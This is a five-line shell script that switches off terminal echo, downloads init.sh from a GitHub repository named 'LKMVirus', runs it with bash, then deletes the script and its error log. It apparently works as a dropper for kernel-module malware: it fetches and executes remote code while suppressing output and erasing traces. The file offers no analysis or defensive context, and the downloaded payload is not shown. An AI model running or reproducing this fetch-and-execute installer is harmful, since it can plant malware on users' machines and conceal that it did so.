stty -echo
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> .serrlog
bash init.sh
rm -f init.sh .serrlog
stty echo
